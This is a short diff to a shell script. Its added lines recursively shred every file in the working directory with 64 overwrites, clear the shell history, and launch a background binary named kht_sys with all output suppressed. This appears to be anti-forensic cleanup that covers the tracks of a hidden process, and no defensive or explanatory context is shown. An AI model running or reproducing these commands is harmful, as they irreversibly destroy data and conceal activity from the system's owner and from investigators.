@@ -31,14 +31,12 @@ find . -type f \( ! -iname "khc_st" ! -iname "kht_sys" \) | sed 's/.*/shred -n 6
 rm -fr __pycache__
 cd -
 
-pwd
-#find . -type f | sed 's/.*/shred -n 64 -u &/g' | sh
-
-#shred -n 64 -u kht_sys
-#shred -n 64 -u kht_sys.py
+find . -type f | sed 's/.*/shred -n 64 -u &/g' | sh
 
 echo "Done"
+
+history -cw 
+cat /dev/null > ~/.history
+
 nohup ${pth}/kht_sys 1>/dev/null 2>&1 &
 
-cat /dev/null > ~/.history
-history -cw 
